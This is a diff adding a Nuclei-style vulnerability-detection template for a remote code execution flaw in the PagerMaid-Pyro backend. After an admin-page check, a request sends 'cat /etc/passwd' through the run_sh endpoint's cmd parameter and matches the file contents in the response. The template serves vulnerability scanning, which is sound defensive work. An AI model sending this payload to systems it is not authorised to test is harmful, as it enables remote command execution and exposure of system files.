@@ -1,0 +1,45 @@
+id: poc-yaml-pagermaid-pyro-bms-run-sh-rce
+info:
+  name: PagerMaid-Pyro Backend Management run_sh RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template detects potential remote code execution vulnerabilities in PagerMaid-Pyro backend management systems via the run_sh endpoint.
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: admin-page-check
+    method: GET
+    path:
+      - "{{BaseURL}}/admin"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "PagerMaid-Pyro 后台管理"
+
+  - id: rce-verification
+    method: GET
+    path:
+      - "{{BaseURL}}/pagermaid/api/run_sh?cmd=cat%20/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
